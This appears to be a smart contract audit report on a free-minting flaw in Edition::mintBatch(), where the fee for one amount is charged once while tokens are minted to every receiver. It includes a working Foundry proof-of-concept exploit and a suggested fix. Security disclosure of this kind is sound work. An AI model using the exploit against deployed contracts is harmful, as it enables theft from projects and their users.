# `Edition::mintBatch()-0x904868b2`, the attacker can mint token for free

## Summary
`Edition::mintBatch()-0x904868b2`, the attacker can mint token for free
## Vulnerability Detail
1.`Edition::mintBatch()-0x904868b2`, the attacker can mint token for free,`amount_` is the amount that each address in receivers_ will receive, and receivers_ can have multiple addresses. But here you only need to pay the amount_ casting fee once in `FeeManager::collectMintFee()`, and you can cast it multiple times in the following loop
2.The user calls `Edition::mintBatch()-0x904868b2` and sends ETH. When the `Edition::mintBatch()-0x904868b2` code is executed to `FEE_MANAGER.collectMintFee()`, the corresponding value in the `Edition` contract will be ETH is sent to the `FEE_MANAGER` contract. At this time, `address(Edition).balance == 0`. When the program executes to `_refundExcess();`, since the balance in the contract is 0, the excess ETH sent by the caller will not be refunded, and the excess ETH will remain in In `FeeManager`, at this point, the attacker can consume the ETH in the contract to mint tokens.
```js
    function mintBatch(
        address[] calldata receivers_,
        uint256 tokenId_,
        uint256 amount_,
        bytes calldata data_
    ) external payable {
        // wake-disable-next-line reentrancy
@>        FEE_MANAGER.collectMintFee{value: msg.value}(
            this, tokenId_, amount_, msg.sender, address(0), works[tokenId_].strategy
        );


@>        for (uint256 i = 0; i < receivers_.length; i++) {
            _issue(receivers_[i], tokenId_, amount_, data_);
        }


        _refundExcess();
    }
```
### Poc
Please add to `Edition.t.sol` and execute
```js
    function test_mintBatchFreeMintingTokens() public {
        // init attacker
        address attacker = makeAddr("attacker");
        // Get the fee to mint 1 token
        uint256 fee = feeManager.getMintFee(edition, 1, 1).amount;
        assertEq(fee, 0.0106 ether);
        deal(attacker, fee);
        // init receivers
        address[] memory receivers = new address[](10);
        for (uint256 i = 0; i < receivers.length; ++i) {
            receivers[i] = attacker;
        }
        // calls mintBatch
        vm.prank(attacker);
        edition.mintBatch{value: fee}(receivers, 1, 1, new bytes(0));
        assertEq(edition.totalSupply(1), 10);
        assertEq(edition.balanceOf(attacker, 1), 10); // The attacker gets 10 tokens
        assertEq(attacker.balance, 0);
    }
    // [PASS] test_mintBatchFreeMintingTokens() (gas: 253357)
```

When the program executes to `_refundExcess();`, since the balance in the contract is 0, the excess ETH sent by the caller will not be refunded, and the excess ETH will remain in In `FeeManager`, at this time the attacker only needs to ensure msg.value > 0 to consume the ETH in the contract to obtain the token.

Manual Review

## Recommendation
We can try Calculate the total amount of tokens and verify msg.value and send the corresponding amount
```diff
    function mintBatch(
        address[] calldata receivers_,
        uint256 tokenId_,
        uint256 amount_,
        bytes calldata data_
    ) external payable {
+       uint256 totalAmount_ = amount_ * receivers_.length;
+       uint256 sendValue = FEE_MANAGER.getMintFee(works[tokenId_].strategy, totalAmount_).amount;
+       if (msg.value < sendValue) revert();
        // wake-disable-next-line reentrancy
+        FEE_MANAGER.collectMintFee{value: sendValue}(        
-        FEE_MANAGER.collectMintFee{value: msg.value}(
-            this, tokenId_, amount_, msg.sender, address(0), works[tokenId_].strategy
+            this, tokenId_, totalAmount_, msg.sender, address(0), works[tokenId_].strategy
        );


        for (uint256 i = 0; i < receivers_.length; i++) {
            _issue(receivers_[i], tokenId_, amount_, data_);
        }


        _refundExcess();
    }
```
